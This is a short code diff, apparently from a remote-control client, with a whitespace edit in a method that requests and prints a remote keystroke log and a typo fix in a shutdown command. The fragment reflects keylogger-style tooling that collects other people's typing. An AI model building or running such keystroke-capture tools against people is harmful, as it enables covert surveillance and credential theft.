@@ -195,7 +195,7 @@ class Controller():
         self._socket.send("keystroke,print")
         log_len = int(self._socket._sock.recv(32).decode('utf8'))
         print(log_len)
-        data = self._socket.receive(length=log_len).decode("utf8")
+        data = self._socket.receive(length = log_len).decode("utf8")
         print(data)
         self._function.print_keystroke(data)
 
@@ -280,7 +280,7 @@ class Controller():
 
     # Function 6
     def shutdown(self, event):
-        self._socket._isconnected = self._socket.send("shutdonwn")
+        self._socket._isconnected = self._socket.send("shutdown")
         self._socket.shutdown()
 
     # Window utilities methods
